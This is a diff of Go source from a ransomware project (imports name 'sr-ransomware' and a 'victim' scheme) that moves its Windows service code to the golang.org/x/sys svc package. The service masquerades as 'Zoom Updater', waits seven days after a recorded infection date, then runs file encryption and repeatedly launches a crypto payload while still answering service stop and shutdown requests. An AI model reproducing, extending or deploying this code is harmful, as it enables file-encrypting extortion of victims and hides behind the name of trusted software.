@@ -7,7 +7,7 @@ import (
     "runtime"
     "path/filepath"
 
-    "github.com/sug0/gowinsvc"
+    "golang.org/x/sys/windows/svc"
     "github.com/sug0/sr-ransomware/go/win"
     "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 )
@@ -111,14 +111,28 @@ func cryptoMain() {
 
 func serviceMain() {
     runtime.LockOSThread()
-    manager := gowinsvc.NewService("Zoom Updater")
     s := service{
         exec: `"`+os.Args[0] + (`" ` + cryptoArg),
     }
-    manager.StartServe(&s)
+    svc.Run("zoomupdater", &s)
 }
 
-func (s *service) Serve(exit <-chan bool) {
+func willExit(c svc.ChangeRequest, changes chan<- svc.Status) (exit bool) {
+    switch c.Cmd {
+    case svc.Stop, svc.Shutdown:
+        exit = true
+        changes <- svc.Status{State: svc.StopPending}
+    case svc.Interrogate:
+        changes <- c.CurrentStatus
+        time.Sleep(100 * time.Millisecond)
+        changes <- c.CurrentStatus
+    }
+    return
+}
+
+func (s *service) Execute(_ []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
+    changes <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
+
     var err error
     s.date, err = victim.InfectionDate()
     if err != nil {
@@ -130,43 +144,51 @@ func (s *service) Serve(exit <-chan bool) {
     s.date = s.date.Add(7 * 24 * time.Hour)
 
     if time.Now().Before(s.date) {
-        s.beforeDeployment(exit)
+        s.beforeDeployment(r, changes)
+        return
     }
-    s.afterDeployment(exit)
+    s.afterDeployment(r, changes)
+    return
 }
 
-func (s *service) beforeDeployment(exit <-chan bool) {
+func (s *service) beforeDeployment(r <-chan svc.ChangeRequest, changes chan<- svc.Status) {
     for {
         select {
-        case <-exit:
-            return
+        case c := <-r:
+            if willExit(c, changes) {
+                return
+            }
         case t := <-time.After(1 * time.Minute):
             if t.After(s.date) {
-                s.afterDeployment(exit)
+                s.afterDeployment(r, changes)
             }
         }
     }
 }
 
-func (s *service) afterDeployment(exit <-chan bool) {
+func (s *service) afterDeployment(r <-chan svc.ChangeRequest, changes chan<- svc.Status) {
     done := make(chan struct{})
     go encryptFiles(done)
     for {
         select {
-        case <-exit:
-            return
+        case c := <-r:
+            if willExit(c, changes) {
+                return
+            }
         case <-done:
-            s.afterEncryption(exit)
+            s.afterEncryption(r, changes)
         }
     }
 }
 
-func (s *service) afterEncryption(exit <-chan bool) {
+func (s *service) afterEncryption(r <-chan svc.ChangeRequest, changes chan<- svc.Status) {
     s.launchCrypto()
     for {
         select {
-        case <-exit:
-            return
+        case c := <-r:
+            if willExit(c, changes) {
+                return
+            }
         case <-time.After(5 * time.Minute):
             s.launchCrypto()
         }
